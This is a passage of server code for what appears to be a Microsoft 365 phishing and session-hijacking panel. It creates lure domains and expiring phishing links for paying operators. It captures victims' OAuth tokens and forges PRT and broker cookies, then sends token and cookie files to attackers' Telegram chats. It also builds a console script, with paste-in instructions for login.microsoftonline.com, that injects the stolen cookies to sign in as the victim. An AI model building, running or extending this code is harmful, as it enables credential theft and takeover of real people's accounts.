      prt_token: prtToken || crypto.createHash('sha256').update(refreshToken).digest('hex'),
      
      // Device info
      device_id: deviceId,
      device_registered: deviceRegistered,
      device_platform: 'Windows',
      device_name: `Broker-Device-${crypto.randomBytes(3).toString('hex')}`,
      
      // User info
      user_id: userId,
      email: email,
      user_name: email.split('@')[0],
      
      // Token hashes
      access_token_hash: crypto.createHash('sha256').update(accessToken || '').digest('hex').slice(0, 64),
      refresh_token_hash: crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 64),
      
      // PRT metadata
      _prt: prtToken ? prtToken.slice(0, 128) : crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 128),
      _auth_session: (accessToken || '').slice(0, 256),
      _device_id: deviceId.replace(/-/g, '').slice(0, 64),
      _session_id: crypto.randomUUID(),
      
      // Timestamps
      issued_at: new Date().toISOString(),
      expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      
      // Token info
      token_type: 'Bearer',
      scope: SCOPE,
      tenant: TENANT,
      
      // Broker info
      broker_client_id: CLIENT_ID || '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
      prt_version: 'v2.0',
      prt_device_registered: deviceRegistered
    };

    // Step 4: Generate AAD broker token (JWT)
    const brokerTokenData = generateAADBrokerToken({ 
      refresh_token: refreshToken, 
      access_token: accessToken,
      id_token: idToken,
      token_type: 'Bearer'
    }, email, userId);

    // Step 5: Save updated cookie file
    const cookiePath = cookieFilePath(email);
    writeJsonMaybeEncrypted(cookiePath, {
      email,
      user_id: userId,
      timestamp: new Date().toISOString(),
      device_id: deviceId,
      prt: prtData,
      prt_token: prtToken,
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      created_by: 'manual_generate_with_broker_prt',
      device_registered: deviceRegistered,
      prt_registration_error: brokerError
    });

    // Step 6: Build console injection script for real cookies
    const brokerToken = brokerTokenData.broker_token;
    let cookieInjectionScript = `// Real Microsoft AAD Cookies & PRT Injection\n`;
    cookieInjectionScript += `// Generated: ${new Date().toISOString()}\n`;
    cookieInjectionScript += `// Email: ${email}\n`;
    cookieInjectionScript += `// Device: ${deviceId}\n`;
    cookieInjectionScript += `// Device Registered: ${deviceRegistered ? '✅ YES' : '❌ NO (Using Synthetic PRT)'}\n\n`;
    
    cookieInjectionScript += `// 1. Inject broker refresh token credential\n`;
    cookieInjectionScript += `document.cookie="x-ms-RefreshTokenCredential=${encodeURIComponent(brokerToken)}; path=/; max-age=31536000; Secure; SameSite=None";\n\n`;

    cookieInjectionScript += `// 2. Inject PRT and device cookies (1-year expiry)\n`;
    if (prtData && typeof prtData === 'object') {
      for (const [k, v] of Object.entries(prtData)) {
        const safeVal = typeof v === 'string' ? v : JSON.stringify(v);
        // Skip internal fields, only inject cookie-friendly values
        if (!k.startsWith('_') && k !== 'issued_at' && k !== 'expires_at') {
          cookieInjectionScript += `document.cookie="${k}=${encodeURIComponent(safeVal.substring(0, 500))}; path=/; max-age=31536000; Secure; SameSite=None";\n`;
        }
      }
    }

    cookieInjectionScript += `\nconsole.log('✅ Real Microsoft AAD Cookies + PRT injected (1-year expiry)');\n`;
    cookieInjectionScript += `console.log('👤 Email: ${email}');\n`;
    cookieInjectionScript += `console.log('📱 Device: ${deviceId}');\n`;
    cookieInjectionScript += `console.log('${deviceRegistered ? '✅ PRT from Broker' : '⚠️  Synthetic PRT (Device not registered)'}');\n`;
    cookieInjectionScript += `setTimeout(() => { window.location.href = '/'; }, 2000);\n`;

    logAudit({ 
      action: 'generate_cookies_with_broker_prt', 
      admin: req.session.user.username, 
      email, 
      device_id: deviceId,
      device_registered: deviceRegistered,
      broker_error: brokerError,
      ip: req.ip 
    });

    // Step 7: Send files to Telegram
    try {
      const admins = getAdminUsers();
      const adminChatIds = new Set();
      if (admins && admins.length) {
        admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); });
      }
      const globalSettings = readSettingsSafe();
      if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);

      for (const chatId of adminChatIds) {
        const botToken = getBotTokenFromSettingsOrEnv();
        const prtStatus = deviceRegistered ? '✅ Real PRT from Broker' : '⚠️ Synthetic PRT';
        const errorNote = brokerError ? `\n❌ Broker Error: ${brokerError}` : '';
        
        await notifyTelegram(
          '🍪 Real Microsoft Cookies Generated (Broker PRT)', 
          `Email: ${email}\nDevice: ${deviceId}\nPRT Status: ${prtStatus}${errorNote}\nAdmin: ${req.session.user.username}`, 
          email, 
          chatId, 
          botToken
        );
        
        if (fs.existsSync(tokenPath)) {
          await sendFileToTelegram(tokenPath, `🔑 Real Tokens for ${email}`, chatId, botToken);
        }
        if (fs.existsSync(cookiePath)) {
          await sendFileToTelegram(cookiePath, `🍪 Real AAD Cookies & PRT for ${email}`, chatId, botToken);
        }
      }
    } catch (e) {
      console.warn('Failed to send to Telegram:', e && e.message);
    }

    res.json({
      success: true,
      email,
      device_id: deviceId,
      broker_token: brokerTokenData.broker_token,
      prt: prtData,
      prt_token: prtToken,
      device_registered: deviceRegistered,
      broker_error: brokerError,
      console_script: cookieInjectionScript,
      expires_at: brokerTokenData.expires_at,
      instructions: {
        step1: 'Open https://login.microsoftonline.com in a new tab',
        step2: 'Press F12 to open Developer Console',
        step3: 'Go to Console tab',
        step4: 'Paste the console_script and press Enter',
        step5: 'You will be redirected and logged in as ' + email,
        note: deviceRegistered ? 'Using REAL PRT from Microsoft Broker' : 'Using synthetic PRT - consider authenticating first'
      }
    });
  } catch (err) {
    console.error('Generate real cookies error:', err);
    res.status(500).json({ error: err.message || 'failed to generate real cookies' });
  }
});

// ===== OVERVIEW =====
app.get('/api/overview', requireLogin, (req, res) => {
  try {
    const files = fs.readdirSync(COOKIES_DIR).filter(Boolean);
    const cookieFiles = files.filter(n => n.startsWith('cookiesfile_') && n.endsWith('.json'));
    const tokenFiles = files.filter(n => n.startsWith('tokenfile_') && n.endsWith('.json'));

    function readMeta(file) {
      try {
        const full = path.join(COOKIES_DIR, file);
        const data = readJsonMaybeEncrypted(full);
        return data;
      } catch (e) {
        return null;
      }
    }

    const cookieMeta = cookieFiles.map(f => ({ file: f, meta: readMeta(f) })).filter(x => x.meta);
    const tokenMeta = tokenFiles.map(f => ({ file: f, meta: readMeta(f) })).filter(x => x.meta);

    const emailsSet = new Set();
    const cookieFileNames = [];
    const tokenFileNames = [];

    for (const c of cookieMeta) {
      const meta = c.meta || {};
      const email = meta.email || meta.user_email || c.file.replace(/^cookiesfile_/, '').replace(/\.json$/, '').replace(/_at_/g, '@').replace(/_/g, '.');
      const created_by = meta.created_by || email || 'unknown';

      if (req.session.user && req.session.user.role !== 'admin') {
        if (created_by !== req.session.user.username && email !== req.session.user.username) continue;
      }

      emailsSet.add(email);
      cookieFileNames.push(c.file);
    }

    for (const t of tokenMeta) {
      const meta = t.meta || {};
      const email = meta.email || meta.user_email || t.file.replace(/^tokenfile_/, '').replace(/\.json$/, '').replace(/_at_/g, '@').replace(/_/g, '.');
      const created_by = meta.created_by || email || 'unknown';

      if (req.session.user && req.session.user.role !== 'admin') {
        if (created_by !== req.session.user.username && email !== req.session.user.username) continue;
      }

      emailsSet.add(email);
      tokenFileNames.push(t.file);
    }

    // include per-user vault entries counts for stats
    let perUserVaultCount = 0;
    try {
      const userVaultFiles = fs.readdirSync(COOKIES_DIR).filter(n => n.startsWith('uservault_') && n.endsWith('.json'));
      for (const f of userVaultFiles) {
        const emailFromFile = f.replace(/^uservault_/, '').replace(/\.json$/, '').replace(/_at_/g, '@').replace(/_/g, '.');
        if (req.session.user && req.session.user.role !== 'admin') {
          if (emailFromFile !== req.session.user.username && emailFromFile !== req.session.user.email) continue;
        }
        const arr = readJsonMaybeEncrypted(path.join(COOKIES_DIR, f)) || [];
        perUserVaultCount += arr.length;
      }
    } catch (e) {}

    const emails = Array.from(emailsSet);

    res.json({
      stats: {
        uniqueEmails: emails.length,
        cookieFiles: cookieFileNames.length,
        tokenFiles: tokenFileNames.length,
        userVaultEntries: perUserVaultCount
      },
      emails,
      cookieFiles: cookieFileNames,
      tokenFiles: tokenFileNames
    });
  } catch (err) {
    res.status(500).json({ error: err.message || 'failed to load overview' });
  }
});

// ===== VAULT =====
app.get('/api/vault', requireLogin, (req, res) => {
  try {
    if (req.session.user && req.session.user.role === 'admin') {
      let adminVault = [];
      if (fs.existsSync(vaultFilePath())) {
        try { adminVault = readJsonMaybeEncrypted(vaultFilePath()) || []; } catch (e) { adminVault = []; }
      }
      const userVaultFiles = fs.readdirSync(COOKIES_DIR).filter(n => n.startsWith('uservault_') && n.endsWith('.json'));
      for (const f of userVaultFiles) {
        try {
          const uarr = readJsonMaybeEncrypted(path.join(COOKIES_DIR, f)) || [];
          adminVault = adminVault.concat(uarr.map(x => ({ ...x, source_file: f })));
        } catch (e) {}
      }
      return res.json({ success: true, vault: adminVault });
    } else {
      const email = req.session.user.email || req.session.user.username;
      const p = userTokensFilePath(email);
      let entries = [];
      if (fs.existsSync(p)) {
        try { entries = readJsonMaybeEncrypted(p) || []; } catch (e) { entries = []; }
      }
      entries = entries.map(e => ({
        ...e,
        tokens_download_url: e.tokens_download_url || `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`,
        cookies_download_url: e.cookies_download_url || `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`
      }));
      return res.json({ success: true, vault: entries });
    }
  } catch (e) {
    return res.status(500).json({ error: e.message || 'failed to load vault' });
  }
});

// Download cookies
app.get('/api/download/cookies/:email', requireLogin, (req, res) => {
  const email = req.params.email;
  if (!(req.session.user && (req.session.user.role === 'admin' || req.session.user.username === email))) {
    return res.status(403).json({ error: 'forbidden' });
  }

  const p = cookieFilePath(email);
  if (!fs.existsSync(p)) return res.status(404).json({ error: 'cookie file not found' });

  const raw = fs.readFileSync(p, 'utf8');
  if (raw.startsWith('ENCRYPTED\n')) {
    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="cookies_${sanitizeFilenamePart(email)}.json"`);
    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
    return res.send(plain);
  } else {
    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
    return res.download(p, `cookies_${sanitizeFilenamePart(email)}.json`);
  }
});

// Download tokens (admin only)
app.get('/api/download/tokens/:email', requireLogin, requireAdmin, (req, res) => {
  const email = req.params.email;
  const p = tokenFilePath(email);

  if (!fs.existsSync(p)) return res.status(404).json({ error: 'token file not found' });

  try {
    const audit = { admin: req.session.user.username, action: 'download_tokens', email, ip: req.ip };
    logAudit(audit);
  } catch (e) {}

  const raw = fs.readFileSync(p, 'utf8');
  if (raw.startsWith('ENCRYPTED\n')) {
    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
    return res.setHeader('Content-Type', 'application/json') || res.send(plain);
  } else {
    return res.download(p, `tokens_${sanitizeFilenamePart(email)}.json`);
  }
});

// Delete files (admin)
app.delete('/api/files/:email', requireLogin, requireAdmin, (req, res) => {
  const email = req.params.email;
  const cookieP = cookieFilePath(email);
  const tokenP = tokenFilePath(email);
  const userVaultP = userTokensFilePath(email);
  const removed = [];

  if (fs.existsSync(cookieP)) { fs.unlinkSync(cookieP); removed.push(path.basename(cookieP)); }
  if (fs.existsSync(tokenP)) { fs.unlinkSync(tokenP); removed.push(path.basename(tokenP)); }
  if (fs.existsSync(userVaultP)) { fs.unlinkSync(userVaultP); removed.push(path.basename(userVaultP)); }

  logAudit({ action: 'delete_files', admin: req.session.user.username, email, removed, ip: req.ip });
  res.json({ removed });
});

// ===== DOMAINS =====
app.get('/api/domains', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/domains', method: 'GET', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const p = domainsFilePath();
  let domains = [];

  if (fs.existsSync(p)) {
    domains = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  if (req.session.user && req.session.user.role !== 'admin') {
    domains = domains.filter(d => d.created_by === req.session.user.username);
  }

  res.json({ domains });
});

app.post('/api/domains', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/domains', method: 'POST', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  try {
    const { domain, cloudflare } = req.body || {};
    if (!domain) return res.status(400).json({ error: 'domain required' });
    if (!isValidDomain(domain)) return res.status(400).json({ error: 'invalid domain' });

    const p = domainsFilePath();
    let domains = [];
    if (fs.existsSync(p)) {
      domains = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
    }

    if (domains.find(d => d.domain === domain)) {
      return res.json({ success: true, existing: true });
    }

    const record = {
      domain,
      verified: true,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      cloudflare_zone_id: cloudflare?.zone_id || null
    };

    domains.unshift(record);
    fs.writeFileSync(p, JSON.stringify(domains, null, 2), 'utf8');

    notifyTelegram('✅ Domain Added', `Domain: ${domain}\n👤 User: ${req.session.user.username}`, req.session.user.username).catch(()=>{});
    logAudit({ action: 'domain_added', user: req.session.user.username, domain, ip: req.ip });

    res.json({ success: true, domain, verified: true });
  } catch (err) {
    res.status(500).json({ error: err.message || 'failed to add domain' });
  }
});

app.delete('/api/domains/:domain', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: `/api/domains/${req.params.domain}`, method: 'DELETE', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const domain = req.params.domain;
  const p = domainsFilePath();
  let domains = [];

  if (fs.existsSync(p)) {
    domains = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  const domainRecord = domains.find(d => d.domain === domain);
  if (!domainRecord) return res.status(404).json({ error: 'domain not found' });

  if (req.session.user.role !== 'admin' && domainRecord.created_by !== req.session.user.username) {
    return res.status(403).json({ error: 'forbidden' });
  }

  domains = domains.filter(d => d.domain !== domain);
  fs.writeFileSync(p, JSON.stringify(domains, null, 2), 'utf8');

  logAudit({ action: 'domain_deleted', user: req.session.user.username, domain, ip: req.ip });
  res.json({ success: true });
});

// ===== LINKS =====
app.get('/api/links', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/links', method: 'GET', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const p = linksFilePath();
  let links = [];

  if (fs.existsSync(p)) {
    links = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  if (req.session.user && req.session.user.role !== 'admin') {
    links = links.filter(l => l.created_by === req.session.user.username);
  }

  res.json({ links });
});

app.post('/api/links', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/links', method: 'POST', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  try {
    const { domain, title, description, doc_type, landing_url } = req.body || {};

    if (!domain) return res.status(400).json({ error: 'domain required' });
    if (!doc_type) return res.status(400).json({ error: 'doc_type required' });

    const domainsPath = domainsFilePath();
    let domains = [];
    if (fs.existsSync(domainsPath)) {
      domains = JSON.parse(fs.readFileSync(domainsPath, 'utf8') || '[]');
    }

    const domainRecord = domains.find(d => d.domain === domain);
    if (!domainRecord) return res.status(404).json({ error: 'domain not found' });
    if (!domainRecord.verified) return res.status(400).json({ error: 'domain not verified' });

    if (req.session.user.role !== 'admin' && domainRecord.created_by !== req.session.user.username) {
      return res.status(403).json({ error: 'forbidden: domain not owned' });
    }

    const subdomain = generateWorkerStyleId();

    const linksPath = linksFilePath();
    let links = [];
    if (fs.existsSync(linksPath)) {
      links = JSON.parse(fs.readFileSync(linksPath, 'utf8') || '[]');
    }

    const linkId = generateRandomId(16);
    const linkRecord = {
      id: linkId,
      domain,
      subdomain,
      title: title || 'Untitled',
      description: description || '',
      doc_type,
      landing_url: landing_url || null,
      client_id: CLIENT_ID,
      tenant: TENANT,
      scope: SCOPE,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      expires_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      visits: 0,
      visitors: []
    };

    links.unshift(linkRecord);
    fs.writeFileSync(linksPath, JSON.stringify(links, null, 2), 'utf8');

    logAudit({ action: 'link_created', user: req.session.user.username, linkId, domain, ip: req.ip });

    res.json({
      success: true,
      link: linkRecord,
      subdomain,
      url: `https://${subdomain}.${domain}`
    });
  } catch (err) {
    console.error('Link creation error:', err);
    res.status(500).json({ error: err.message || 'Failed to create link' });
  }
});

app.delete('/api/links/:id', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: `/api/links/${req.params.id}`, method: 'DELETE', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const id = req.params.id;
  const p = linksFilePath();
  let links = [];

  if (fs.existsSync(p)) {
    links = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  const link = links.find(l => l.id === id);
  if (!link) return res.status(404).json({ error: 'link not found' });

  if (req.session.user.role !== 'admin' && link.created_by !== req.session.user.username) {
    return res.status(403).json({ error: 'forbidden' });
  }

  const remaining = links.filter(l => l.id !== id);
  fs.writeFileSync(p, JSON.stringify(remaining, null, 2), 'utf8');

  logAudit({ action: 'link_deleted', user: req.session.user.username, linkId: id, ip: req.ip });

  res.json({ success: true });
});

// ===== SETTINGS =====
app.get('/api/settings', requireLogin, (req, res) => {
  try {
    const users = fs.existsSync(usersFilePath()) ? JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]') : [];
    const currentUser = users.find(u => u.username === req.session.user.username) || {};

    if (req.session.user.role === 'admin') {
      let settings = {};
      if (fs.existsSync(settingsFilePath())) {
        try { settings = readJsonMaybeEncrypted(settingsFilePath()); } catch (e) { settings = {}; }
      }
      return res.json({
        ...settings,
        user_telegram_chat_id: currentUser.telegram_chat_id || '',
        user_telegram_bot_token: currentUser.telegram_bot_token || ''
      });
    }

    return res.json({
      telegram_chat_id: currentUser.telegram_chat_id || '',
      telegram_bot_token: currentUser.telegram_bot_token || ''
    });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
});

app.post('/api/settings', requireLogin, requireAdmin, (req, res) => {
  try {
    const { telegram_bot_token, telegram_chat_id, per_user_telegram } = req.body || {};

    let settings = {};
    if (fs.existsSync(settingsFilePath())) {
      try { settings = readJsonMaybeEncrypted(settingsFilePath()) || {}; } catch (e) { settings = {}; }
    }

    settings.telegram_bot_token = telegram_bot_token || settings.telegram_bot_token;
    settings.telegram_chat_id = telegram_chat_id || settings.telegram_chat_id;
    if (per_user_telegram && typeof per_user_telegram === 'object') settings.per_user_telegram = { ...(settings.per_user_telegram || {}), ...per_user_telegram };
    writeJsonMaybeEncrypted(settingsFilePath(), settings);

    logAudit({ action: 'settings_updated', admin: req.session.user.username, fields: Object.keys(req.body), ip: req.ip });

    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message || 'save failed' });
  }
});

// ===== ADMIN USERS =====
app.get('/api/admin/users', requireLogin, requireAdmin, (req, res) => {
  let users = [];
  if (fs.existsSync(usersFilePath())) {
    users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
  }
  users = users.map(u => ({
    username: u.username,
    role: u.role,
    email: u.email,
    telegram_chat_id: u.telegram_chat_id || null,
    created_at: u.created_at,
    expires_at: u.expires_at,
    status: u.expires_at && new Date(u.expires_at) < new Date() ? 'expired' : 'active'
  }));
  res.json({ users });
});

app.post('/api/admin/users', requireLogin, requireAdmin, async (req, res) => {
  try {
    const { username, password, role, email, expires_at, telegram_chat_id } = req.body || {};

    if (!username || !password) {
      return res.status(400).json({ error: 'username & password required' });
    }

    let users = [];
    if (fs.existsSync(usersFilePath())) {
      users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    }

    if (users.find(u => u.username === username)) {
      return res.status(409).json({ error: 'user exists' });
    }

    const hash = bcrypt.hashSync(password, 10);

    const newUser = {
      username,
      passwordHash: hash,
      role: role || 'user',
      email: email || `${username}@broker.local`,
      telegram_chat_id: telegram_chat_id || null,
      created_at: new Date().toISOString(),
      expires_at: expires_at || null
    };

    users.push(newUser);
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

    await notifyTelegram(
      '👤 New User Created',
      `Username: ${username}\n📧 Email: ${newUser.email}\n⏱️ Expires: ${expires_at || 'Never'}`,
      req.session.user.email
    );

    logAudit({ action: 'admin_create_user', admin: req.session.user.username, username, ip: req.ip });

    res.json({ success: true, user: newUser });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/admin/users/:username', requireLogin, requireAdmin, (req, res) => {
  try {
    const target = req.params.username;
    let users = [];
    if (fs.existsSync(usersFilePath())) {
      users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    }
    const idx = users.findIndex(u => u.username === target);
    if (idx === -1) return res.status(404).json({ error: 'user not found' });
    users.splice(idx, 1);
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

    logAudit({ action: 'admin_delete_user', admin: req.session.user.username, username: target, ip: req.ip });

    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.put('/api/admin/users/:username', requireLogin, requireAdmin, (req, res) => {
  const { expires_at } = req.body || {};
  const username = req.params.username;

  let users = [];
  if (fs.existsSync(usersFilePath())) {
    users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
  }

  const user = users.find(u => u.username === username);
  if (!user) return res.status(404).json({ error: 'user not found' });

  user.expires_at = expires_at || null;
  user.updated_at = new Date().toISOString();

  fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

  logAudit({ action: 'admin_update_user_expiry', admin: req.session.user.username, username, expires_at, ip: req.ip });

  res.json({ success: true, user });
});

// ===== OAUTH FLOW =====
app.post('/api/auth/start', (req, res) => {
  try {
    if (!CLIENT_ID) return res.status(400).json({ error: 'CLIENT_ID not configured' });

    const state = generateRandomId(32);
    const tenant = TENANT;
    const redirectUri = `${APP_BASE_URL}/api/auth/callback`;

    saveOAuthState(state, {
      redirect_uri: redirectUri,
      created_at: new Date().toISOString()
    });

    const params = new URLSearchParams({
      client_id: CLIENT_ID,
      response_type: 'code',
      redirect_uri: redirectUri,
      response_mode: 'query',
      scope: SCOPE,
      state: state,
      prompt: 'select_account'
    });

    const authUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/authorize?${params.toString()}`;

    res.json({ success: true, auth_url: authUrl });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/auth/callback', async (req, res) => {
  try {
    const { code, state, error, error_description } = req.query;

    if (error) {
      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent(error_description || error)}`);
    }

    if (!code || !state) {
      return res.redirect(`${OAUTH_DONE_LANDING}?error=Missing%20code%20or%20state`);
    }

    const stateData = getOAuthState(state);
    if (!stateData) {
      return res.redirect(`${OAUTH_DONE_LANDING}?error=Invalid%20state`);
    }
    removeOAuthState(state);

    const tokenUrl = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`;
    const tokenBody = new URLSearchParams({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET || '',
      code,
      redirect_uri: stateData.redirect_uri,
      grant_type: 'authorization_code'
    });

    const tokenResp = await fetch(tokenUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: tokenBody
    });

    let tokenData = null;
    const tokenText = await tokenResp.text().catch(()=>null);
    try { tokenData = tokenText ? JSON.parse(tokenText) : null; } catch(err) {
      console.error('Token exchange parse failed, raw:', tokenText);
      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent('Token exchange returned non-JSON')}`);
    }

    if (!tokenResp.ok) {
      console.error('Token exchange error:', tokenData || tokenText);
      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent(tokenData?.error_description || tokenData?.error || 'Token exchange failed')}`);
    }

    if (!tokenData || !tokenData.access_token) {
      console.error('Token exchange missing access_token:', tokenData || tokenText);
      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent('Token exchange missing access_token')}`);
    }

    const info = extractFromIdToken(tokenData.id_token || tokenData.access_token);
    const email = info?.email || 'unknown@microsoft.com';
    const userId = info?.id || 'unknown';

    const prtData = generatePrimaryRefreshToken(tokenData, email);
    const brokerTokenData = generateAADBrokerToken(tokenData, email, userId);

    const tokenPath = tokenFilePath(email);
    writeJsonMaybeEncrypted(tokenPath, {
      email,
      user_id: userId,
      timestamp: new Date().toISOString(),
      tokens: {
        access_token: tokenData.access_token,
        id_token: tokenData.id_token,
        refresh_token: tokenData.refresh_token,
        expires_in: tokenData.expires_in,
        token_type: tokenData.token_type,
        scope: tokenData.scope
      },
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      created_by: 'oauth'
    });

    const cookiePath = cookieFilePath(email);
    writeJsonMaybeEncrypted(cookiePath, {
      email,
      user_id: userId,
      timestamp: new Date().toISOString(),
      prt: prtData,
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      created_by: 'oauth'
    });

    const downloadTokensUrl = `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`;
    const downloadCookiesUrl = `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`;

    const vaultEntry = {
      email,
      user_id: userId,
      device_id: brokerTokenData.device_id,
      broker_token: brokerTokenData.broker_token,
      broker_payload: brokerTokenData.broker_payload,
      tokens_file: path.basename(tokenPath),
      cookies_file: path.basename(cookiePath),
      tokens_download_url: downloadTokensUrl,
      cookies_download_url: downloadCookiesUrl,
      created_at: new Date().toISOString(),
      created_by: 'oauth',
      expires_at: brokerTokenData.expires_at
    };

    try {
      saveToVault(email, {
        email,
        user_id: userId,
        broker_token: brokerTokenData.broker_token,
        broker_payload: brokerTokenData.broker_payload,
        device_id: brokerTokenData.device_id,
        created_at: new Date().toISOString(),
        status: 'active',
        expires_at: brokerTokenData.expires_at
      });
    } catch (e) {
      console.warn('Failed to save to admin vault:', e && e.message);
    }

    try {
      saveUserVaultEntry(email, vaultEntry);
      let matchedUser = null;
      if (fs.existsSync(usersFilePath())) {
        const usersList = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
        matchedUser = usersList.find(u => (u.email && u.email.toLowerCase() === email.toLowerCase()) || (u.username && u.username.toLowerCase() === email.toLowerCase()));
        if (!matchedUser && email && email.includes('@')) {
          const localPart = email.split('@')[0].toLowerCase();
          matchedUser = usersList.find(u => u.username && u.username.toLowerCase() === localPart);
        }
        if (matchedUser) {
          const ownerIdentifier = matchedUser.email || matchedUser.username;
          if (ownerIdentifier !== email) saveUserVaultEntry(ownerIdentifier, vaultEntry);
        }
      }
    } catch (e) {
      console.warn('Failed to save user vault:', e && e.message);
    }

    // ===== TELEGRAM NOTIFICATIONS & FILE SEND =====
    try {
      const admins = getAdminUsers();
      const adminChatIds = new Set();
      if (admins && admins.length) {
        admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); });
      }
      const globalSettings = readSettingsSafe();
      if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);

      for (const chatId of adminChatIds) {
        await notifyTelegram('🔔 New OAuth Token Received', `Email: ${email}\nDevice: ${brokerTokenData.device_id}`, email, chatId);
        // Send token file to admin
        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 OAuth Tokens for ${email}`, chatId);
        // Send cookie/PRT file to admin
        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, chatId);
      }
    } catch (e) {
      console.warn('Admin notify/send failed:', e && e.message);
    }

    try {
      const matchedUser = findMatchingUserForEmail(email);
      let userChatId = (matchedUser && matchedUser.telegram_chat_id) || getChatIdForUser(email);
      let userBotToken = (matchedUser && matchedUser.telegram_bot_token) || getBotTokenForUser(email);
      if (userChatId) {
        await notifyTelegram('🔐 Your OAuth tokens are ready', `User: ${email}\nDevice: ${brokerTokenData.device_id}`, email, userChatId, userBotToken);
        // Send token file to user
        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, userChatId, userBotToken);
        // Send cookie/PRT file to user
        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, userChatId, userBotToken);
      }
    } catch (e) {
      console.warn('User notify/send failed:', e && e.message);
    }

    logAudit({ action: 'oauth_complete', email, device_id: brokerTokenData.device_id, ip: req.ip });

    res.redirect(`${OAUTH_DONE_LANDING}?success=true&email=${encodeURIComponent(email)}`);
  } catch (err) {
    console.error('OAuth callback error:', err);
